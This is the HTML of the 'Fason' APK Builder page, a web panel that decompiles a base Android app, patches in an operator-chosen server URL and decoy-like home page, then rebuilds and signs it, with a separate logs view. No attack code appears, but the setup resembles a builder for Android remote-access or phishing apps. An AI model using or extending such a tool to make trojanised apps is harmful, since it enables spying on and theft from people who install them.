<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APK Builder</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <nav class="navbar">
        <a href="/" class="brand"><span class="fs-icon-sm">FS</span> Fason</a>
        <div class="nav-links">
            <a href="/">Dashboard</a>
            <a href="/builder" class="active">Builder</a>
            <a href="/logs">Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </nav>

    <main class="container">
        <div class="card builder-card">
            <h2>APK Builder</h2>
            <p class="subtitle">Configure and build your APK with custom server settings</p>

            <div class="section-title">Server Configuration</div>

            <div class="form-group">
                <label for="serverUrl">Server URL <span class="required">*</span></label>
                <div class="input-group-flex">
                    <input type="text" id="serverUrl" placeholder="https://example.com" autocomplete="off">
                    <button class="auto-detect-btn" id="autoDetectBtn">Auto Detect</button>
                </div>
                <div id="urlInfo" class="url-info hidden">
                    <div class="row">
                        <div class="col">
                            <div class="label">Protocol</div>
                            <div class="value" id="protocolValue">-</div>
                        </div>
                        <div class="col">
                            <div class="label">Host</div>
                            <div class="value" id="hostValue">-</div>
                        </div>
                        <div class="col">
                            <div class="label">Port</div>
                            <div class="value" id="portValue">-</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="section-divider"></div>
            <div class="section-title collapsible" onclick="toggleSection('customiseSection')">
                <span class="toggle-icon">▶</span> App Appearance <span class="optional-tag">Optional</span>
            </div>
            <div id="customiseSection" class="collapsible-content" style="display: none;">
                <div class="form-group">
                    <label for="homePageUrl">Home Page URL</label>
                    <input type="text" id="homePageUrl" placeholder="https://example.com" value="https://google.com" autocomplete="off">
                </div>
            </div>

            <button id="buildBtn" class="btn primary">
                <span class="icon">⚙</span> Build APK
            </button>

            <div id="progress" class="progress-section hidden">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <p id="progressText">Preparing...</p>
            </div>

            <div id="result" class="result-section hidden">
                <div class="success-icon">✓</div>
                <p>APK Built Successfully!</p>
                <a href="/Fason.apk" class="btn success" download>
                    <span class="icon">↓</span> Download APK
                </a>
            </div>

            <div id="error" class="error-section hidden">
                <div class="error-icon">✕</div>
                <p id="errorText">Build failed</p>
            </div>
        </div>

        <div class="card info-card">
            <h3>Requirements</h3>
            <ul>
                <li>Java JDK 8+ must be installed</li>
                <li>apktool.jar in factory folder</li>
                <li>uber-apk-signer.jar in factory folder</li>
            </ul>
            <h3>Build Process</h3>
            <ol>
                <li>Decompile base APK</li>
                <li>Patch server URL & home page URL</li>
                <li>Rebuild APK</li>
                <li>Sign APK</li>
            </ol>
        </div>
    </main>

    <div id="toast" class="toast"></div>
    <script src="/js/app.js"></script>
</body>
</html>
